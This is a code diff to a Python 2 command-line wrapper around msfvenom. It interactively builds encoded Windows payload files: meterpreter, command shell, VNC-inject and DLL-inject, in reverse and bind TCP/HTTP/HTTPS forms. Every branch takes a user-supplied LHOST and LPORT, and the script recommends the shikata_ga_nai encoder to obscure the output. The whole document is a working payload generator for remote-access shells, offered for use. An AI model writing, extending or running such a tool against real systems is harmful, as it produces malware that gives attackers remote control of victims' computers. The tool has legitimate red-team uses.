@@ -34,7 +34,7 @@ while (True):
     print GR + "What is the target operating system?" + W
     print "(1) Windows"
     opsys = raw_input("[>] ")
-    print C + "Choose the payload to generate:" + W
+    print C + "Choose the payload to generate:" + P
     print "(1) windows/meterpreter/reverse_tcp"
     print "(2) windows/meterpreter/bind_tcp"
     print "(3) windows/meterpreter/reverse_http"
@@ -50,25 +50,85 @@ while (True):
     print "(11) windows/vncinject/reverse_http"
     print "(12) windows/vncinject/reverse_https"
     print "     "
-    print "(13) windows/upexec/reverse_tcp"
-    print "(14) windows/upexec/bind_tcp"
-    print "(15) windows/upexec/reverse_http"
-    print "(15) windows/upexec/reverse_https"
+    print "(13) windows/dllinject/reverse_tcp"
+    print "(14) windows/dllinject/bind_tcp"
+    print "(15) windows/dllinject/reverse_http"
+    print "(16) windows/dllinject/reverse_https" + W
     payop = raw_input("[>] ")
-    print "Good..good. What is the LHOST? (run ifconfig to check. Use public IP address for payload to be utilized outside of LAN network.)"
+    print "Good..good. What is the " +  O + "LHOST?" + w
     lhost = raw_input("[>] ")
-    print "What is the LPORT?" + P + " (typically 4444)" + W
+    print "What is the " + O + "LPORT?" + W
     lport = raw_input("[>] ")
-    print "What is the encoder being used?" + P + " (typically x86/shikata_ga_nai)" + W
+    print "What is the encoder being used?" + O + " (typically x86/shikata_ga_nai)" + W
     encode = raw_input("[>] ")
     print "How many iterations should the encoder be used?"
     iteration = raw_input("[>] ")
     print B + "Almost done..." + W
-    print "What is the format you the file to be in? " + P + "(usually .exe)" + W
+    print "What is the format you the file to be in? " + W
     formatop = raw_input("[>] ")
     print "What would you like to name the payload?"
     payname = raw_input("[>] ")
+    print O + "Creating payload..." + W
+
     if payop == "1":
-        print O + "Creating payload..." + W
         with open("{}.{}".format(payname, formatop), 'w') as outfile:
-            call(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", "--platform" "Windows" "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
+            call(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
+    elif payop == "2":
+        with open("{}.{}".format(payname, formatop), 'w') as outfile:
+            call(["msfvenom", "-p", "windows/meterpreter/bind_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
+    elif payop == "3":
+        with open("{}.{}".format(payname, formatop), 'w') as outfile:
+            call(["msfvenom", "-p", "windows/meterpreter/reverse_http", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
+    elif payop == "4":
+        with open("{}.{}".format(payname, formatop), 'w') as outfile:
+            call(["msfvenom", "-p", "windows/meterpreter/reverse_https", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
+    elif payop == "5":
+        with open("{}.{}".format(payname, formatop), 'w') as outfile:
+            call(["msfvenom", "-p", "windows/shell/reverse_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
+    elif payop == "6":
+        with open("{}.{}".format(payname, formatop), 'w') as outfile:
+            call(["msfvenom", "-p", "windows/shell/bind_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
+    elif payop == "7":
+        with open("{}.{}".format(payname, formatop), 'w') as outfile:
+            call(["msfvenom", "-p", "windows/shell/reverse_http", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
+    elif payop == "8":
+        with open("{}.{}".format(payname, formatop), 'w') as outfile:
+            call(["msfvenom", "-p", "windows/shell/reverse_https", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
+    elif payop == "9":
+        with open("{}.{}".format(payname, formatop), 'w') as outfile:
+            call(["msfvenom", "-p", "windows/vncinject/reverse_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
+    elif payop == "10":
+        with open("{}.{}".format(payname, formatop), 'w') as outfile:
+            call(["msfvenom", "-p", "windows/vncinject/bind_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
+    elif payop == "11":
+        with open("{}.{}".format(payname, formatop), 'w') as outfile:
+            call(["msfvenom", "-p", "windows/vncinject/reverse_http", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
+    elif payop == "12":
+        with open("{}.{}".format(payname, formatop), 'w') as outfile:
+            call(["msfvenom", "-p", "windows/vncinject/reverse_https", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
+    elif payop == "13":
+        print G + "Additional option required: " + W + " Specify path to " + O + "reflective dll script." + W
+        dllpath = raw_input("[>] ")
+        with open("{}.{}".format(payname, formatop), 'w') as outfile:
+            call(["msfvenom", "-p", "windows/dllinject/reverse_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "DLL={}".format(dllpath), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
+    elif payop == "14":
+        print G + "Additional option required: " + W + " Specify path to " + O + "reflective dll script." + W
+        dllpath = raw_input("[>] ")
+        with open("{}.{}".format(payname, formatop), 'w') as outfile:
+            call(["msfvenom", "-p", "windows/dllinject/bind_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "DLL={}".format(dllpath), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
+    elif payop == "15":
+        print G + "Additional option required: " + W + " Specify path to " + O + "reflective dll script." + W
+        dllpath = raw_input("[>] ")
+        with open("{}.{}".format(payname, formatop), 'w') as outfile:
+            call(["msfvenom", "-p", "windows/dllinject/reverse_http", "LHOST={}".format(lhost), "LPORT={}".format(lport), "DLL={}".format(dllpath), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
+    elif payop == "16":
+        print G + "Additional option required: " + W + " Specify path to " + O + "reflective dll script." + W 
+        dllpath = raw_input("[>] ")
+        with open("{}.{}".format(payname, formatop), 'w') as outfile:
+            call(["msfvenom", "-p", "windows/dllinject/reverse_https", "LHOST={}".format(lhost), "LPORT={}".format(lport), "DLL={}".format(dllpath), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
+    else:
+        redo = raw_input(R + "[>] Something went wrong. Care to start over? (y/n)" + W)
+        if redo == "y":
+            continue
+        else:
+            sys.exit()
